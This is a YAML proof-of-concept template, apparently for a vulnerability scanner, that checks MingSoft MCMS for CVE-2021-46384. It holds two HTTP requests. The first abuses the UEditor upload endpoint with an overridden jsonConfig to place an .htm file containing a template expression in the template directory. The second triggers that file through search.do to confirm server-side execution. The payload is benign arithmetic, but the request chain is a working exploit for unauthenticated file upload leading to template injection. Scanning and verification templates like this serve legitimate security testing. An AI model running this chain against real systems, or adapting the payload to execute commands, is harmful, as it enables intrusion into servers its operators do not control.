name: yaml-poc-mingsoft-mcms-unauthorized_access-CVE-2021-46384
binding: 6d7b0273-6bc6-42df-ad2b-ea8f9e2e89d6
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2021-46384/
        - https://gitee.com/mingSoft/MCMS/issues/I4QZ1O
        - https://nvd.nist.gov/vuln/detail/CVE-2021-46384
    vulnerability:
        id: ed39f234-8291-4a75-b9c0-e8b442fc8192
        level: critical
    warning: File Upload
transport: http
set:
    r1: randomInt(140000, 144800)
    r2: randomInt(260000, 264800)
    rboundary: randomLowercase(8)
    randname: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=%7BvideoUrlPrefix%3A%27%27%2CfileManagerListPath%3A%27%27%2CimageMaxSize%3A204800000%2CvideoMaxSize%3A204800000%2CfileMaxSize%3A204800000%2CfileUrlPrefix%3A%27%27%2CimageUrlPrefix%3A%27%27%2CimagePathFormat%3A%27%2Ftemplate%2F1%2Fdefault%2F%7Btime%7D%27%2CfilePathFormat%3A%27%2Fupload%2F1%2Fcms%2Fcontent%2Feditor%2F%7Btime%7D%27%2CvideoPathFormat%3A%27%2Fupload%2F1%2Fcms%2Fcontent%2Feditor%2F%7Btime%7D%27%2C%22imageAllowFiles%22%3A%5B%22.png%22%2C%20%22.jpg%22%2C%20%22.jpeg%22%2C%20%22.gif%22%2C%20%22.bmp%22%2C%22.htm%22%5D%7D%0A&action=uploadimage
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"{{randname}}.htm\"\r\nContent-Type: image/png\r\n\r\n${{{r1}} + {{r2}}} \r\n------WebKitFormBoundary{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"htm")
        output:
            search: '''"title":.?"(?P<filepath>\\d+.htm)"''.bsubmatch(response.body)'
            filepath: search["filepath"]
    r1:
        request:
            cache: true
            method: GET
            path: /mcms/search.do?tmpl={{filepath}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
expression: r0() && r1()
